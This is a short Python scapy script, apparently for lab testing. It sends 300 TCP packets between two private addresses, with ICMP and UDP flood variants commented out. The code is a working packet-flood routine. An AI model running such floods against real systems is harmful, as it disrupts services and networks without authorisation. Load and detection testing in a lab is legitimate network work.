import scapy.all as scapy

# Test Case 1: Flood the target with TCP packets
for _ in range(300): 
    packet = scapy.IP(src="192.168.1.10", dst="192.168.1.20") / scapy.TCP(dport=80)
    scapy.send(packet)

# # Test Case 2: Flood the target with ICMP Echo Request (ping) packets
# for _ in range(300): 
#     packet = scapy.IP(src="192.168.1.10", dst="192.168.1.20") / scapy.ICMP()
#     scapy.send(packet)

# # Test Case 3: Flood the target with UDP packets
# for _ in range(300):  
#     packet = scapy.IP(src="192.168.1.10", dst="192.168.1.20") / scapy.UDP(dport=53)  # DNS Port
#     scapy.send(packet)
